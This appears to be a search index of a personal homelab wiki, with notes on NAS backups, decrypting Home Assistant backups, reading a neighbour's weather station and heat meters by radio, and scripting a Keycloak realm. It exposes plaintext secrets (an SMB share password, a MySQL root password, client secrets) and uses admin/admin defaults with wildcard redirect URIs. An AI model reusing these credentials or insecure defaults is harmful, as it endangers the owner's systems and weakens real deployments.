PAPERLESS_URL\n</code></pre>"},{"location":"homelab/home_nas_server.html#backup","title":"Backup:","text":"<pre><code>sudo apt install cifs-utils psmisc\n\n# ngx-paperless\n## Export\ncd /home/ubuntu/paperless-ngx\ndocker compose exec -T webserver document_exporter ../export --no-thumbnail --use-folder-prefix --zip\n## Import \ndocument_importer source\n\n## Trilium automatically creates backups in the data/backups directory\n\n## Monica\ndocker-compose exec mysql /usr/bin/mysqldump -u root --password=sekret_root_password monica &gt; monica.sql\n\ncat &lt;&lt; EOF | tee ~/.credentials\nusername=share\npassword=y7WXgvd@rZmG_h2fDAVNZdiBxghWuLdigXGd9BAFfM*T.J*_r7dct_mRsEE9xhzhjbgzd.qxN4sjWGDo9bh**66iULBQtc_UZQbg\ndomain=192.168.178.152\nEOF\n\nmkdir /mnt/truenas_backup\nmount -t cifs -o credentials=~/.credentials //192.168.178.152/apps-backup /mnt/truenas_backup\n# Check if it works\nmount -t cifs\n\nmkdir /mnt/truenas_backup/paperless-ngx\ncp /home/ubuntu/paperless-ngx/export/*.zip /mnt/truenas_backup/paperless-ngx/\ncp /home/ubuntu/trilium/trilium-data/backup/*.db /mnt/truenas_backup/trilium/\n\numount -t cifs /mnt/truenas_backup\n</code></pre>"},{"location":"homelab/home_nas_server.html#updates","title":"Updates","text":""},{"location":"homelab/home_nas_server.html#proxmox","title":"Proxmox","text":"<pre><code>apt update\napt full-upgrade\n\n# Once you are sure you don't need to roll back\nzpool status\nzpool upgrade\n</code></pre>"},{"location":"homelab/home_nas_server.html#guides","title":"Guides","text":"<p>Everything: https://tteck.github.io/Proxmox/</p> <p>TrueNAS:</p> <p>https://recoverit.wondershare.com/nas-recovery/truenas-proxmox.html</p>"},{"location":"homelab/home_nas_server.html#other","title":"Other","text":"<p>https://github.com/danitso/terraform-provider-proxmox https://olav.ninja/deploying-kubernetes-cluster-on-proxmox-part-1</p> <p>https://github.com/DanielHabenicht/homelab.config</p>"},{"location":"homelab/smarthome/awtrix_ui.html","title":"Awtrix UI","text":"<p>Project to create a UI for the Awtrix smart home display.</p> <p>https://github.com/DanielHabenicht/Hobby.UlanziUI</p>","tags":["smarthome","awtrix","ui"]},{"location":"homelab/smarthome/extract_file_from_encrypted_homeassistant_backup.html","title":"Extract a file from a Homeassistant Backup","text":"<ol> <li> <p>Create a local file:  decrypt.py<pre><code>#!/usr/bin/env python3\n\nimport sys\nimport getopt\nimport hashlib\nimport tarfile\nimport glob\nimport os\nimport shutil\n\nfrom pathlib import Path\n\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (\n    Cipher,\n    algorithms,\n    modes,\n)\n\ndef _password_to_key(password):\n    password = password.encode()\n    for _ in range(100):\n        password = hashlib.sha256(password).digest()\n    return password[:16]\n\ndef _generate_iv(key, salt):\n    temp_iv = key + salt\n    for _ in range(100):\n        temp_iv = hashlib.sha256(temp_iv).digest()\n    return temp_iv[:16]\n\nclass SecureTarFile:\n    def __init__(self, filename, password):\n        self._file = None\n        self._name = Path(filename)\n\n        self._tar = None\n        self._tar_mode = \"r|gz\"\n\n        self._aes = None\n        self._key = _password_to_key(password)\n\n        self._decrypt = None\n\n    def __enter__(self):\n        self._file = self._name.open(\"rb\")\n\n        cbc_rand = self._file.read(16)\n\n        self._aes = Cipher(\n            algorithms.AES(self._key),\n            modes.CBC(_generate_iv(self._key, cbc_rand)),\n            backend=default_backend(),\n        )\n\n        self._decrypt = self._aes.decryptor()\n\n        self._tar = tarfile.open(fileobj=self, mode=self._tar_mode)\n        return self._tar\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        if self._tar:\n            self._tar.close()\n        if self._file:\n            self._file.close()\n\n    def read(self, size = 0):\n        return self._decrypt.update(self._file.read(size))\n\n    @property\n    def path(self):\n        return self._name\n\n    @property\n    def size(self):\n        if not self._name.is_file():\n            return 0\n        return round(self._name.stat().st_size / 1_048_576, 2)  # calc mbyte\n\ndef _extract_tar(filename):\n    _dirname = '.'.join(filename.split('.')[:-1])\n\n    try:\n        shutil.rmtree('_dirname')\n    except FileNotFoundError:\n        pass\n\n    print(f'Extracting {filename}...')\n    _tar  = tarfile.open(name=filename, mode=\"r\")\n    _tar.extractall(path=_dirname)\n\n    return _dirname\n\ndef _extract_secure_tar(filename, password):\n    _dirname = '.'.join(filename.split('.')[:-2])\n    print(f'Extracting secure tar {filename.split(\"/\")[-1]}...')\n    try:\n        with SecureTarFile(filename, password) as _tar:\n            _tar.extractall(path=_dirname)\n    except tarfile.ReadError:\n        print(\"Unable to extract SecureTar - maybe your password is wrong or the tar is not password encrypted?\")\n        sys.exit(5)\n\n    return _dirname\n\ndef print_usage():\n    print(f'{sys.argv[0]} -i &lt;inputfile&gt; -p &lt;password&gt;')\n\ndef main():\n    _inputfile = None\n    _password=None\n\n    try:\n        opts, args = getopt.getopt(sys.argv[1:],\"hi:p:\")\n    except getopt.GetoptError:\n        print_usage()\n        sys.exit(2)\n    for opt, arg in opts:\n        if opt == '-h':\n            print_usage()\n            sys.exit()\n        elif opt in (\"-i\"):\n            _inputfile = arg\n        elif opt in (\"-p\"):\n            _password = arg\n\n    if not _inputfile:\n        print (\"Missing inputfile\")\n        print_usage()\n        sys.exit(3)\n\n    if not _password:\n        print (\"Missing password\")\n        print_usage()\n        sys.exit(4)\n\n    _dirname = _extract_tar(_inputfile)\n    for _secure_tar in glob.glob(f'{_dirname}/*.tar.gz'):\n        _extract_secure_tar(_secure_tar, _password)\n        os.remove(_secure_tar)\n\n    print(\"Done\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></p> </li> <li> <p>Download your backup, e.g. <code>hass_backup_2024-07-14-01-01.Home.tar</code></p> </li> <li>Run the script: <code>python3 decrypt.py -i hass_backup_2024-07-14-01-01.Home.tar -p &lt;Your Password&gt;</code></li> <li>Look into the newly created folder <code>hass_backup_2024-07-14-01-01.Home</code></li> </ol> <p>Thanks to this comment: https://community.home-assistant.io/t/backup-snapshots-no-longer-decryptable/104048/12</p>"},{"location":"homelab/smarthome/hassio_bluetooth_atc_xiaomi.html","title":"Hassio bluetooth atc xiaomi","text":"<p>BTHome v2! </p>"},{"location":"homelab/smarthome/install-squeezelite-on-raspberry.html","title":"Add Squeezelite to an existing Raspberry installation","text":"<pre><code># Install required dependencies\nsudo apt-get update\nsudo apt-get install libasound2-dev libflac-dev libmad0-dev libvorbis-dev libfaad-dev libmpg123-dev liblircclient-dev libncurses5-dev\n\nsudo apt-get install\n# DO NOT Download the latest squeezlite version (as there seems to be a compatibilty issue between pulse audio and newer versions)\n# https://sourceforge.net/projects/lmsclients/files/squeezelite/\n# cd /home/pi\n# mkdir squeezelite\n# cd squeezelite\n# wget https://sourceforge.net/projects/lmsclients/files/squeezelite/linux/squeezelite-2.0.0.1486-armhf.tar.gz\n# tar -xzf squeezelite-2.0.0.1486-armhf.tar.gz\n# sudo mv squeezelite /usr/bin/squeezelite\n</code></pre> <p>Installed!</p>"},{"location":"homelab/smarthome/install-squeezelite-on-raspberry.html#connect-bluetooth-speaker","title":"Connect Bluetooth Speaker","text":"<pre><code>sudo apt-get install pulseaudio-module-bluetooth\n\nuser@raspi$ bluetoothctl \n[NEW] Controller XX:XX:XX:XX:XX:XX raspi [default]\n[bluetooth]# agent on\nAgent registered\n[bluetooth]# scan on\n[bluetooth]# scan off\n[bluetooth]# pairable on\nChanging pairable on succeeded\n[bluetooth]# pair XX:XX:XX:XX:XX:XX\nAttempting to pair with XX:XX:XX:XX:XX:XX\n[CHG] Device XX:XX:XX:XX:XX:XX Paired: yes\nPairing successful\n[bluetooth]# trust XX:XX:XX:XX:XX:XX\nChanging XX:XX:XX:XX:XX:XX trust succeeded\n[bluetooth]# connect XX:XX:XX:XX:XX:XX\nAttempting to connect to XX:XX:XX:XX:XX:XX\n[CHG] Device XX:XX:XX:XX:XX:XX Connected: yes\nConnection successful\n[CHG] Device XX:XX:XX:XX:XX:XX ServicesResolved: yes\n[bluetooth]# exit\n\npactl list sinks short\npactl set-default-sink 3\n</code></pre>"},{"location":"homelab/smarthome/install-squeezelite-on-raspberry.html#configuration","title":"Configuration","text":"<p>Try out if the command works by executing <code>squeezelite</code> on the command line with all parameter beforehand. </p> <pre><code>sudo bash -c 'cat &gt;/etc/systemd/system/squeezelite.service &lt;&lt;EOL\n[Unit]\nRequires=bluetooth.service\nAfter=network.target bluetooth.service\nDescription=Squeezelite Client\n\n[Service]\n# Workaround as it does not seem to work with the systemd User= config\n# https://github.com/ralph-irving/squeezelite/issues/130\nExecStart=runuser -l  pi -c '/usr/bin/squeezelite -o default'\n\n[Install]\nWantedBy=multi-user.target\n\nEOL'\n\nsudo systemctl enable squeezelite\nsudo systemctl start squeezelite\n</code></pre> <p>References:</p> <ul> <li>https://hagensieker.com/2018/06/12/302/</li> <li>http://www.winko-erades.nl/installing-squeezelite-player-on-a-raspberry-pi-running-jessie/</li> <li>https://forums.raspberrypi.com/viewtopic.php?t=204808</li> </ul>"},{"location":"homelab/smarthome/rtl_sdr.html","title":"Use the weatherstation of your neighbour","text":"<p>My Setup consists of a Rasperry Pi 3 and a <code>RTL2832U+ FC0012</code> Stick. </p> <p>Install: - rtl_433 by following the installation guide. </p> <p>Capture all devices in your vicinity. Maybe you have luck and somebody already uses a weatherstation.  <pre><code>rtl_433 -f 868M\nrtl_433 version 22.11-75-gcc6f4521 branch master at 202301311232 inputs file rtl_tcp RTL-SDR\nUse -h for usage help and see https://triq.org/ for documentation.\nTrying conf file at \"rtl_433.conf\"...\nTrying conf file at \"/home/pi/.config/rtl_433/rtl_433.conf\"...\nTrying conf file at \"/usr/local/etc/rtl_433/rtl_433.conf\"...\nTrying conf file at \"/etc/rtl_433/rtl_433.conf\"...\n\nNew defaults active, use \"-Y classic -s 250k\" for the old defaults!\n\n[Protocols] Registered 201 out of 234 device decoding protocols [ 1-4 8 11-12 15-17 19-23 25-26 29-36 38-60 63 67-71 73-100 102-105 108-116 119-121 124-128 130-149 151-161 163-168 170-175 177-197 199 201-215 217-228 230-232 234 ]\n[SDR] Found 1 device(s)\n[SDR] trying device  0:  Realtek, RTL2838UHIDIR, SN: 00000001\nDetached kernel driver\nFound Rafael Micro R828D tuner\n[SDR] Using device 0: Generic RTL2832U OEM\nExact sample rate is: 1000000.026491 Hz\n[R82XX] PLL not locked!\nAllocating 15 zero-copy buffers\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\ntime      : 2024-10-27 12:58:58\nmodel     : Bresser-6in1 id        : 13010656\nchannel   : 0            Battery   : 0             Temperature: 13.0 C       Humidity  : 94            Sensor type: 1            Wind Gust : 0.0 m/s\nWind Speed: 0.0 m/s      Direction : 202           UV        : 0.0           Startup   : 1             Flags     : 0             Integrity : CRC\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\ntime      : 2024-10-27 12:59:22\nmodel     : Bresser-6in1 id        : 13010656\nchannel   : 0            Battery   : 0             Temperature: 13.0 C       Humidity  : 94            Sensor type: 1            Wind Gust : 0.5 m/s\nWind Speed: 0.5 m/s      Direction : 202           UV        : 0.0           Startup   : 1             Flags     : 0             Integrity : CRC\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\n</code></pre></p> <p>Configure rtl_443 by creating a <code>home/pi/rlt_443.conf</code>: <pre><code>gain          0\nfrequency     868M\nppm_error     0\nreport_meta   time:tz\noutput mqtt://&lt;ip&gt;,user=&lt;username&gt;,pass=&lt;password&gt;,devices=rtl_433/9b13b3f4-rtl433/devices[/type][/model][/subtype][/channel][/id],events=rtl_433/9b13b3f4-rtl433/events,states=rtl_433/9b13b3f4-rtl433/states\noutput log\n</code></pre></p> <p>Setup a service (<code>/etc/systemd/system/rtl_433.service</code>): </p> <pre><code>[Unit]\nDescription=RTL_433\nDocumentation=man:rtl_433\nStartLimitIntervalSec=10\nAfter=syslog.target network.target\n\n[Service]\nType=exec\nExecStart=/usr/local/bin/rtl_433 -c /home/pi/rtl_433.conf\nRestart=always\nRestartSec=30s\n\n# View with: sudo journalctl -f -u rtl_433 -o cat\nSyslogIdentifier=rtl_433\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"homelab/smarthome/rtl_sdr.html#integration-with-home-assistant","title":"Integration with Home Assistant","text":"<p>There are Add-Ons to do the same but I simply used manual mqtt configuration.</p> <pre><code>mqtt:\n  sensor:\n    # Neigbhours Weather Station\n    - name: Temperature\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/temperature_C\n      unique_id: bresser_temperature_C\n      value_template: \"{{ value | float }}\"\n      unit_of_measurement: \"\u00b0C\"\n      device_class: temperature\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Humidity\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/humidity\n      unique_id: bresser_humidity\n      value_template: \"{{ value | int }}\"\n      unit_of_measurement: \"%\"\n      device_class: humidity\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Wind Gust\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/wind_max_m_s\n      unique_id: bresser_wind_max_m_s\n      value_template: \"{{ value | float }}\"\n      unit_of_measurement: \"m/s\"\n      device_class: \"wind_speed\"\n      icon: mdi:weather-windy\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Wind Speed\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/wind_avg_m_s\n      unique_id: bresser_wind_avg_m_s\n      value_template: \"{{ value | float }}\"\n      unit_of_measurement: \"m/s\"\n      device_class: \"wind_speed\"\n      icon: mdi:weather-windy\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Wind Direction Unadjusted\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/wind_dir_deg\n      unique_id: bresser_wind_dir_deg_unadj\n      value_template: \"{{ value | int }}\"\n      unit_of_measurement: \"\u00b0\"\n      icon: mdi:compass-rose\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Rain\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/rain_mm\n      unique_id: bresser_rain_mm\n      value_template: \"{{ value | float }}\"\n      unit_of_measurement: \"mm\"\n      device_class: \"precipitation\"\n      icon: mdi:weather-rainy\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n\n    - name: Last Updated\n      state_topic: rtl_433/9b13b3f4-rtl433/devices/Bresser-6in1/0/318834262/time\n      unique_id: bresser_time\n      device_class: \"timestamp\"\n      icon: mdi:clock-outline\n      device:\n        name: \"Bresser Weather Station\"\n        identifiers:\n          - \"bresser\"\n</code></pre> <p>Parts from:  - https://www.vromans.org/johan/articles/hass_bresser51/index.html - https://techbotch.org/blog/rtl433-autodiscovery/index.html</p>"},{"location":"homelab/smarthome/standing_desk_automation.html","title":"Standing desk automation","text":"<p>https://technicallycompetent.com/hacking-logicdata-desk/ https://github.com/mtfurlan/RoboDesk https://github.com/tjhorner/upsy-desky</p> <p>https://www.logicdata.net/wp-content/uploads/2017/05/Datasheet_Compact_English-Rev4.pdf https://shop.ketterer.de/de/kategorien/motorkabel-handschalter/handschalter/345/handschalter-hsf-mdf-4m4-ld-mit-ausziehmechanismuss https://github.com/tjhorner/esphome-standing-desk</p>"},{"location":"homelab/smarthome/wmbusmeter.html","title":"Read Techem Heat Cost Allocator","text":"<p>My Setup consists of a Rasperry Pi 3 and a <code>RTL2832U+ FC0012</code> Stick. </p>"},{"location":"homelab/smarthome/wmbusmeter.html#installation","title":"Installation","text":"<p>Install: - rtl_433 by following the installation guide.  - rtl-wmbus with <code>make install</code> - wmbusmeters</p> <pre><code>wmbusmeters --logtelegrams rtlwmbus:434.47M\n</code></pre> <p>Create a <code>/etc/wmbusmeters.conf</code> <pre><code>loglevel=normal\ndevice=rtlwmbus\nlogtelegrams=true\nformat=json\n# Log Meter Reading locally (uncomment for longer use)\nmeterfiles=/var/lib/wmbusmeters/meter_readings\nmeterfilesaction=append\nmeterfilesnaming=id\nlogfile=/var/log/wmbusmeters/wmbusmeters.log\n\n# Publish Reading to MQTT to integrate with Home Assistant\nshell=/usr/bin/mosquitto_pub -h &lt;ip&gt; -u &lt;username&gt; -P &lt;password&gt; -t wmbusmeters/$METER_ID -m \"$METER_JSON\"\n</code></pre></p> <p>Add it as a service: </p> <pre><code>[Unit]\nDescription=\"wmbusmeters service\"\nDocumentation=https://github.com/weetmuts/wmbusmeters\nDocumentation=man:wmbusmeters(1)\nAfter=network.target\nStopWhenUnneeded=false\nStartLimitIntervalSec=10\nStartLimitInterval=10\nStartLimitBurst=3\n\n[Service]\nType=forking\nPrivateTmp=yes\nUser=wmbusmeters\nGroup=wmbusmeters\nRestart=always\nRestartSec=1\n\n# Run ExecStartPre with root-permissions\nPermissionsStartOnly=true\nExecStartPre=-/bin/mkdir -p /var/lib/wmbusmeters/meter_readings\nExecStartPre=/bin/chown -R wmbusmeters:wmbusmeters /var/lib/wmbusmeters/meter_readings\nExecStartPre=-/bin/mkdir -p /var/log/wmbusmeters\nExecStartPre=/bin/chown -R wmbusmeters:wmbusmeters /var/log/wmbusmeters\nExecStartPre=-/bin/mkdir -p /run/wmbusmeters\nExecStartPre=/bin/chown -R wmbusmeters:wmbusmeters /run/wmbusmeters\n\nExecStart=/usr/sbin/wmbusmetersd /run/wmbusmeters/wmbusmeters.pid\nExecReload=/bin/kill -HUP $MAINPID\nPIDFile=/run/wmbusmeters/wmbusmeters.pid\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"homelab/smarthome/wmbusmeter.html#integrate-with-home-assistant","title":"Integrate with Home Assistant","text":"<pre><code>mqtt:\n  sensor:\n    # Durchgangszimmer\n    - state_topic: \"wmbusmeters/55252983\"\n      json_attributes_topic: \"wmbusmeters/55252983\"\n      unit_of_measurement: units\n      value_template: \"{{ value_json.current_hca }}\"\n      name: HCA Current\n      state_class: total_increasing\n      unique_id: hca_55252983_hca_current\n      object_id: hca_55252983_hca_current\n      device:\n        identifiers: \"55252983\"\n        manufacturer: \"Techem\"\n        model: \"III\"\n        name: \"Techem HCA Livingroom\"\n    - state_topic: \"wmbusmeters/55252983\"\n      json_attributes_topic: \"wmbusmeters/55252983\"\n      unit_of_measurement: units\n      value_template: \"{{ value_json.previous_hca }}\"\n      name: HCA Previous\n      unique_id: hca_55252983_hca_previous\n      object_id: hca_55252983_hca_previous\n      state_class: total_increasing\n      device:\n        identifiers: \"55252983\"\n    - state_topic: \"wmbusmeters/55252983\"\n      json_attributes_topic: \"wmbusmeters/55252983\"\n      unit_of_measurement: \u00b0C\n      value_template: \"{{ value_json.temp_room_c }}\"\n      name: Temperature Room\n      unique_id: hca_55252983_temp_room\n      object_id: hca_55252983_temp_room\n      device:\n        identifiers: \"55252983\"\n    - state_topic: \"wmbusmeters/55252983\"\n      json_attributes_topic: \"wmbusmeters/55252983\"\n      unit_of_measurement: \u00b0C\n      value_template: \"{{ value_json.temp_radiator_c }}\"\n      name: Temperature Radiator\n      unique_id: hca_55252983_temp_radiator\n      object_id: hca_55252983_temp_radiator\n      device:\n        identifiers: \"55252983\"\n</code></pre> <p>Add Statistic: </p> <pre><code>sensor:\n- platform: statistics\n  name: \"\"\n  unique_id: hca_55252983_hca_current_usage_24h\n  entity_id: sensor.hca_55252983_hca_current\n  state_characteristic: change\n  max_age:\n    hours: 24\n  sampling_size: 3500\n</code></pre>"},{"location":"homelab/smarthome/wmbusmeter.html#manually-capturing-unknown-wmbusmeter-devices","title":"Manually capturing unknown wmbusmeter devices","text":"<pre><code># Use Specific Range and capture all packets for later analysis\nrtl_sdr -f 433M -s 1600000 - | rtl_wmbus | tee test.log\n\n# Decode known packages\ncat test.log | wmbusmeters stdin:rtlwmbus\n</code></pre>"},{"location":"lists/links.html","title":"Links","text":"<p>Refresh SSL Certs of dotnet run https://stackoverflow.com/questions/64618112/asp-net-core-keep-using-the-expired-certificate</p> <p>When and why to use Exceptions: https://web.archive.org/web/20190303182328/http://yoda.arachsys.com/csharp/exceptions.html</p>"},{"location":"lists/list_of_useful_tools.html","title":"List of useful tools","text":"<p>https://justinbarclay.ca/posts/1password-across-the-void/</p> <p>\u200b Guides: \u200b https://brokul.dev/authentication-cookie-lifetime-and-sliding-expiration</p> <p>https://azurecharts.com/</p>"},{"location":"random/2018-09-04-Push-to-TFS-VSTS-Repo-from-Buildagent.html","title":"How to push to TFS/VSTS Repo with the Build Agent Identity","text":"<p>If you want to use semantic-release with TFS/VSTS the Build Agent needs the right to push Tags to your Repo. This is a little fiddly:</p> <p>Based on: https://stackoverflow.com/a/38731565/9277073</p>","tags":["semantic-release","build"]},{"location":"random/2020-04-08-Configure%20Traefik.html","title":"Configure Kubernetes Ingress with Traefik","text":"<p>https://docs.traefik.io/providers/kubernetes-ingress/</p> <p>Goto tests:  https://github.com/containous/traefik/tree/v2.2/pkg/provider/kubernetes/ingress/fixtures</p> <p>Use the config from the .tgz  because there is no documentation in https://github.com/containous/traefik-helm-chart</p>","tags":["kubernetes","traefik"]},{"location":"random/2022-02-12-manim-ThreeDScene-Camera-Angles.html","title":"Use Windows Task Scheduler to Track when you are on the PC","text":"<p>Beginning with Manim and don't know what the angles are supposed to mean? </p> <p>Skip below for a copy paste example with some useful default values. </p> <pre><code># These are the defalt values, applying them should do nothing. \nself.move_camera(phi=0 * DEGREES, theta=-90 * DEGREES, gamma=0 * DEGREES)\nself.wait()\n\n# Simple Move around x axis (which means it will stay put)\nself.move_camera(phi=-45 * DEGREES)\nself.wait()\nself.move_camera(phi=45 * DEGREES)\nself.wait()\n# To be able to differ Theta and gamma angle changes we do not reset phi\n\n# Simple Move around z axis (which means it will stay put)\nself.move_camera(theta=-45 * DEGREES)\nself.wait()\nself.move_camera(theta=-135 * DEGREES)\nself.wait()\nself.move_camera(theta=-90 * DEGREES)\nself.wait()\n\n# Simple Move around y axis (which means it will stay put)\nself.move_camera(gamma=-45 * DEGREES)\nself.wait()\nself.move_camera(gamma=45 * DEGREES)\nself.wait()\nself.move_camera(gamma=0 * DEGREES)\nself.wait()\n\n# Get a 3D View on Coordinate system\nself.move_camera(phi=-45 * DEGREES, theta=-135 * DEGREES, gamma=-45 * DEGREES) \n\n# Get a 3D View on Coordinate system\nself.move_camera(phi=-45 * DEGREES, theta=-45 * DEGREES, gamma=45 * DEGREES) \n</code></pre>","tags":["windows","hassio"]},{"location":"random/2022_07_13_LINQ_Query_Extension.html","title":"LINQ Query Extensions","text":"<p>https://wildmichael.github.io/programming/2020/10/23/dynamically-generating-linq-expressions.html https://tyrrrz.me/blog/expression-trees</p>","tags":["dotnet","linq"]},{"location":"random/2022_07_21_Serilog_Middleware_BodyRequest.html","title":"Serilog Middleware","text":"<p>Issues:  https://github.com/serilog/serilog/issues/1506 https://stackoverflow.com/questions/70943604/serilog-logging-specific-properties-from-request-body-on-error https://stackoverflow.com/questions/63573551/how-to-add-request-body-in-serilogs-output-net-core https://stackoverflow.com/questions/60076922/serilog-logging-web-api-methods-adding-context-properties-inside-middleware https://github.com/serilog/serilog-aspnetcore/issues/168#issuecomment-582896813</p> <p>until found: https://github.com/serilog/serilog/issues/1333</p>","tags":["dotnet","serilog","middleware"]},{"location":"random/create_linux_vm.html","title":"Create linux vm","text":"<p>Create Azure VM </p> <ul> <li>How with Graphics card?</li> </ul> <p>Remote Desktop:  https://docs.microsoft.com/en-us/azure/virtual-machines/linux/use-remote-desktop</p>"},{"location":"random/hardware_setup.html","title":"Hardware setup","text":"<p>Rufus</p> <p>Capacity Testing for Thumb Drives:</p> <p>h2testw</p>"},{"location":"random/keycloak-automatic-realm-setup.html","title":"Keycloak automatic realm setup","text":"<pre><code>#!/bin/bash\ndocker rm generate-keycloak-setup --force || true\ndocker rm generate-keycloak-setup-stage --force || true\ndocker image rm generate-keycloak-setup-stage --force || true\n\n# 1. Run the keycloak container\ndocker run --name generate-keycloak-setup --env KEYCLOAK_ADMIN=admin --env KEYCLOAK_ADMIN_PASSWORD=admin -d quay.io/keycloak/keycloak:latest start-dev\n\n# Wait for server start\nwhile ! docker logs generate-keycloak-setup | grep -q \"Running the server in development mode.\";\ndo\n    sleep 1\n    echo \"waiting for server start...\"\ndone\n\n# 2. Spawn a shell inside the container and modify the realms, user etc \ncat &lt;&lt;EOF | docker exec -i generate-keycloak-setup sh\n# Login into keycloak with admin credentials\n/opt/keycloak/bin/kcadm.sh config credentials --server http://localhost:8080 --user admin --password admin --realm master\n\n/opt/keycloak/bin/kcadm.sh create realms -s realm=businessgpt -s enabled=true\n\n# Create Claim Mapper\n/opt/keycloak/bin/kcadm.sh create -x \"client-scopes\" --target-realm=businessgpt --server http://localhost:8080 -s name=businessgpt -s protocol=openid-connect -s id=3d68dadc-bd71-4dce-93fe-d486fb67b83d -s 'description=Mapper for the BusinessGPT'\n/opt/keycloak/bin/kcadm.sh create -x \"client-scopes/3d68dadc-bd71-4dce-93fe-d486fb67b83d/protocol-mappers/models\" --target-realm=businessgpt --server http://localhost:8080 -s name=user-attribute-role-mapper -s protocol=openid-connect -s protocolMapper=oidc-usermodel-attribute-mapper -s id=b783ca7e-cc53-4d5e-9da4-2f5d5db8e35a -s 'config.\"introspection.token.claim\"=false' -s 'config.\"multivalued\"=true' -s 'config.\"userinfo.token.claim\"=true' -s 'config.\"id.token.claim\"=true' -s 'config.\"claim.name\"=role' -s 'config.\"jsonType.label\"=String' -s 'config.\"user.attribute\"=role'\n\n# Create Client for the businessgpt\n/opt/keycloak/bin/kcadm.sh create clients --target-realm=businessgpt --server http://localhost:8080 -s clientId=businessgpt -s enabled=true -s secret=b1a44ee2-1699-4da8-8e83-874a983e33e7 -s id=206a5ca5-7230-4568-a1ca-5ebe0cba791c -s 'redirectUris=[\"*\"]' -s 'attributes.\"post.logout.redirect.uris\"=*'\n/opt/keycloak/bin/kcadm.sh update -x clients/206a5ca5-7230-4568-a1ca-5ebe0cba791c/optional-client-scopes/3d68dadc-bd71-4dce-93fe-d486fb67b83d --target-realm=businessgpt\n\n# Create users and set passwords\n# Admin\n/opt/keycloak/bin/kcadm.sh create users --target-realm=businessgpt --server http://localhost:8080 -s username=admin -s enabled=true -s email=admin@test.de -s emailVerified=true -s attributes.role=admin\n/opt/keycloak/bin/kcadm.sh set-password --target-realm=businessgpt --server http://localhost:8080 --username admin --new-password password\n\n# Normal User\n/opt/keycloak/bin/kcadm.sh create users --target-realm=businessgpt --server http://localhost:8080 -s username=user -s enabled=true -s email=user@test.de -s emailVerified=true -s attributes.role=user\n/opt/keycloak/bin/kcadm.sh set-password --target-realm=businessgpt --server http://localhost:8080 --username user --new-password password\nEOF\n\n# Stop running server and make an image\ndocker stop generate-keycloak-setup\ndocker commit generate-keycloak-setup generate-keycloak-setup-stage\n\n# Export to realm.json\ndocker run --mount type=bind,source=$(pwd),target=/tmp/export --name generate-keycloak-setup-stage generate-keycloak-setup-stage export --realm businessgpt --dir /tmp/export\n\ndocker rm generate-keycloak-setup\ndocker rm generate-keycloak-setup-stage\ndocker image rm generate-keycloak-setup-stage\n\n\n# Debugging\n# /opt/keycloak/bin/kcadm.sh get clients -r businessgpt --server http://localhost:8080\n# /opt/keycloak/bin/kcadm.sh get -x \"client-scopes\" --target-realm=businessgpt --server http://localhost:8080\n# /opt/keycloak/bin/kcadm.sh get clients/206a5ca5-7230-4568-a1ca-5ebe0cba791c/protocol-mappers/models/6c5aa465-1352-4ad6-9ed8-8398377cd0fe --target-realm=businessgpt --server http://localhost:8080\n\n\n\n# Other\n# /opt/keycloak/bin/kcadm.sh add-roles --realm=businessgpt --server http://localhost:8080 --username admin --rolename admin-role\n# /opt/keycloak/bin/kcadm.sh create roles --realm=businessgpt --server http://localhost:8080 -s name=admin-role -s 'description=Role for \nTool Admins.' -s 'attributes.test=sksid-sk-admin'\n</code></pre> <p>Then simply build and start with the generated configurations:  <pre><code>FROM quay.io/keycloak/keycloak:latest\nCOPY ./generated-realm-realm.json /opt/keycloak/data/import/generated-realm-realm.json\nCOPY ./generated-realm-users-0.json /opt/keycloak/data/import/generated-realm-users-0.json\n</code></pre></p> <pre><code>services:\n  auth:\n    build: Dockerfile\n    environment:\n      - KEYCLOAK_ADMIN=admin\n      - KEYCLOAK_ADMIN_PASSWORD=admin\n    ports:\n      - 8080:8080\n    command:\n      - start-dev\n      - --import-realm\n</code></pre>"},{"location":"random/traefik-keycloak-forward-auth.html","title":"Traefik keycloak forward auth","text":"<p>https://www.keycloak.org/getting-started/getting-started-docker</p> <p>Create new user with email. </p> <p>secret: 9be88129eac68765191d502d884dd9e8   # the master realm (already created)   oidc_issuer_url: https://keycloak.test.aquiver.de/auth/realms/master   # the word id of the created client   oidc_client_id: test   # secret, activated after switchting access type to confidential   oidc_client_secret: 